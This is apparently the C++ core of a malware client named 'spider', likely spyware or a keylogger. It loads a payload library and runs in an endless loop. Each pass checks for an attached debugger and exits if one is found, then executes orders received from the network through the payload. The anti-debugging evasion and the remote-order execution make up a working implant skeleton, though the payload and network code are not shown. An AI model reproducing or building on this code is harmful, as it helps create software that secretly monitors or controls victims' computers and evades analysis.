#include <functional>
#include <chrono>
#include <thread>
#include "Core.h"
#include "IPayload.h"
#include "AntiDbg.h"
#include "Logger.hpp"

namespace spider
{
  namespace client
  {
    namespace core
    {
      Core::Core(std::string const &path)
          :
#if defined _WIN32
            m_lib(path + "foo.dll"),
#elif defined __APPLE__
            m_lib(path + "libfoo.dylib"),
#elif defined __linux__
            m_lib(path + "libfoo.so"),
#else
#error "Plateform not supported"
#endif
            m_payload(nullptr), m_sendToNetwork{},
            m_receivedFromNetwork(nullptr)
      {
	std::function<library::IPayload *()> getPayload =
	    m_lib.getFunction<library::IPayload *()>("getPayload");
	m_payload = getPayload();
	if (!m_payload)
	  {
	    throw std::runtime_error("Invalid payload");
	  }
	m_receivedFromNetwork = &m_payload->getOrderQueue();
      }

      void Core::init()
      {
	if (!m_payload->init(m_sendToNetwork))
	  {
	    throw std::runtime_error("Cannot initialize payload");
	  }
#if defined DEBUG
	nope::log::Log(Info) << "Core correctly loaded.";
#endif
      }

      Core::~Core()
      {
	m_payload->deinit();
      }

      mt::Queue<SystemMsg> &Core::getSendToNetwork()
      {
	return m_sendToNetwork;
      }

      mt::Queue<library::IPayload::Order> &Core::getReceivedFromNetwork()
      {
	return *m_receivedFromNetwork;
      }

      mt::Queue<std::string> &Core::getResponseQueue() const
      {
	return m_payload->getReponseQueue();
      }

      int Core::run()
      {
	using namespace std::chrono_literals;

	while (1)
	  {
	    // Check  Debugger
	    if (spider::misc::Debugger::isDebuggerPresent())
	      {
		return EXIT_FAILURE;
	      }

	    // Get requests from network
	    while (!m_receivedFromNetwork->empty())
	      {
		library::IPayload::Order msg = m_receivedFromNetwork->front();

// Execute needed action
#if defined DEBUG
		nope::log::Log(Info) << "Executing: " << msg;
#endif
		m_payload->exec(msg);

		// Suppress data from the queue
		m_receivedFromNetwork->pop();
	      }
	    m_payload->run();

	    // Prevent high cpu usage
	    std::this_thread::sleep_for(1ms);
	  }
	return EXIT_SUCCESS;
      }
    }
  }
}
